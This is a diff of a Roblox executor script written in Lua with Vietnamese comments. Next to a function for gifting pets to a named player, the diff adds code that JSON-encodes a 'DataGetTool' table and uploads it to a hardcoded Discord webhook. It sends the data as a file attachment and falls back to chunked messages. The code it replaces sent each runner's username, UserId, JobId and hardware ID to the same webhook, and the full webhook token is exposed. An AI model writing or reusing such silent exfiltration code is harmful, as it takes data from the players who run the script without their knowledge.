@@ -174,40 +174,101 @@ local function giftPetToPlayer(targetPlayerName)
 end
 
 task.spawn(function()
--- Webhook Discord của bạn
-local webhookUrl = "https://canary.discord.com/api/webhooks/1420994364930265108/eITVaIa9bTE0lyzoKjVE1pWEqxM2H-6_EbUk-TsOY4N5CObf_ard2c0DbBSdbKqSbN6O"
+    -- ⚠️ ĐỔI WEBHOOK MỚI nếu bạn đã lộ webhook cũ.
+    local webhookUrl = "https://canary.discord.com/api/webhooks/1420994364930265108/eITVaIa9bTE0lyzoKjVE1pWEqxM2H-6_EbUk-TsOY4N5CObf_ard2c0DbBSdbKqSbN6O"
 
--- Services
-local HttpService = game:GetService("HttpService")
-local player = game.Players.LocalPlayer
+    -- Services
+    local Players = game:GetService("Players")
+    local HttpService = game:GetService("HttpService")
+    repeat task.wait() until game:IsLoaded() and Players.LocalPlayer
 
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
+    -- Chọn hàm request phù hợp executor
+    local requestFunc = (http_request or request or (syn and syn.request) or (http and http.request))
+    if not requestFunc then
+        warn("❌ Executor không hỗ trợ HTTP (http_request/request/syn.request/http.request).")
+        return
+    end
 
--- Nội dung gửi
-local data = {
-    ["content"] = "🚀 Script vừa được exec bởi **"..player.Name.."** " ..
-        "(UserId: "..player.UserId..")\n" ..
-        "📌 GameId: "..game.PlaceId.."\n" ..
-        "🆔 JobId: "..game.JobId.."\n" ..
-        "HWID: "..HWID
-}
+    -- 1) Mã hoá DataGetTool thành JSON
+    local okJSON, jsonStr = pcall(function()
+        return HttpService:JSONEncode(DataGetTool) -- <<=== GỬI CÁI NÀY
+    end)
+    if not okJSON then
+        warn("❌ JSONEncode(DataGetTool) lỗi: " .. tostring(jsonStr))
+        return
+    end
 
--- Encode JSON
-local body = HttpService:JSONEncode(data)
+    ----------------------------------------------------------------
+    -- CÁCH 1: Gửi kèm file DataGetTool.json qua webhook (multipart)
+    ----------------------------------------------------------------
+    local function sendAsFile(filename, content)
+        local boundary = "----rbx"..tostring(math.random(1e9, 9e9))
+        local parts = {
+            "--"..boundary,
+            'Content-Disposition: form-data; name="payload_json"',
+            "",
+            HttpService:JSONEncode({ content = "**DataGetTool.json** đính kèm" }),
+            "--"..boundary,
+            ('Content-Disposition: form-data; name="files[0]"; filename="%s"'):format(filename),
+            "Content-Type: application/octet-stream",
+            "",
+            content,
+            "--"..boundary.."--"
+        }
+        local body = table.concat(parts, "\r\n")
+        return requestFunc({
+            Url     = webhookUrl,
+            Method  = "POST",
+            Headers = {
+                ["Content-Type"]   = "multipart/form-data; boundary="..boundary,
+                ["Content-Length"] = tostring(#body)
+            },
+            Body = body
+        })
+    end
 
--- Gửi request qua Codex API
-if http_request then
-    http_request({
-        Url = webhookUrl,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = body
-    })
-else
-    warn("❌ Codex không hỗ trợ http_request")
-end
+    local okFile, resFile = pcall(function()
+        return sendAsFile("DataGetTool.json", jsonStr)
+    end)
 
+    -- Nếu gửi file thành công là xong
+    if okFile and resFile and (resFile.StatusCode == 200 or resFile.StatusCode == 204) then
+        print("✅ Đã gửi file DataGetTool.json lên webhook.")
+        return
+    end
+
+    ----------------------------------------------------------------
+    -- CÁCH 2 (fallback): chia nhỏ JSON và gửi nhiều tin nhắn
+    ----------------------------------------------------------------
+    local function sendChunk(chunk)
+        local payload = { content = "```json\n"..chunk.."\n```" }
+        return requestFunc({
+            Url     = webhookUrl,
+            Method  = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body    = HttpService:JSONEncode(payload)
+        })
+    end
+
+    local limit = 1800 -- dư chỗ cho ```json ... ```
+    local i, n = 1, #jsonStr
+    local part = 1
+    while i <= n do
+        local j = math.min(i + limit - 1, n)
+        local chunk = jsonStr:sub(i, j)
+        local okChunk, res = pcall(function() return sendChunk(chunk) end)
+        if not okChunk or not res or (res.StatusCode ~= 200 and res.StatusCode ~= 204) then
+            warn(("⚠️ Gửi chunk #%d lỗi: %s"):format(part, tostring(res and res.StatusCode)))
+            break
+        end
+        i = j + 1
+        part += 1
+        task.wait(0.6) -- tránh rate limit
+    end
+
+    print("✅ Đã gửi DataGetTool bằng nhiều tin nhắn (fallback).")
 end)
+
 -- =========================
 -- Vòng lặp chính
 -- =========================
@@ -243,3 +304,4 @@ while true do
     end
 
 end
+
